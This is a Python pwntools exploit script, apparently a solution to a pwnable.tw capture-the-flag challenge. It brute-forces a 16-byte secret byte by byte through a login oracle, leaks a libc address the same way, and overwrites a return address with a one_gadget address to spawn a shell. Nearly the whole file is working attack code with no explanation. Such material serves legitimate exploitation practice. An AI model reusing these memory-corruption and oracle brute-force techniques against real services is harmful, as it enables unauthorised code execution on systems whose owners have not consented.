from pwn import *

server = remote('chall.pwnable.tw', 10205)
libc = ELF('./libc_64.so.6')
one_offset = 0xf0567

def login(pwd, login=True):
    if login:
        server.send('1' + 'a'*15)
    else:
        server.send('1')
    server.recvuntil('Your passowrd :')
    server.send(pwd)
    return server.recvuntil('>> ')

def logout():
    server.send('1')
    server.recvuntil('>> ')

def copy(content):
    server.send('3'+'a'*15)
    server.recvuntil('Copy :')
    server.send(content)
    server.recvuntil('>> ')

def Exit():
    server.send('2')

def guess(length, secret):
    for i in range(length):
        for j in range(1, 256):
            if 'Success' in login(secret + chr(j) + '\n', False):
                secret += chr(j)
                logout()
                break
    return secret

secret = guess(16, '')

login('\x00' + 'a'*0x57)
copy('a'*40)
logout()
base = u64(guess(6, 'a'*16 + '1' + 'a'*7)[24:] + '\x00\x00') - 324 - libc.symbols['setvbuf']

one_gadget = base + one_offset

payload = '\x00'+'a'*63 + secret + 'a'*24 + p64(one_gadget)

login(payload)

copy('a'*0x30)

Exit()

print(hex(base))

server.interactive()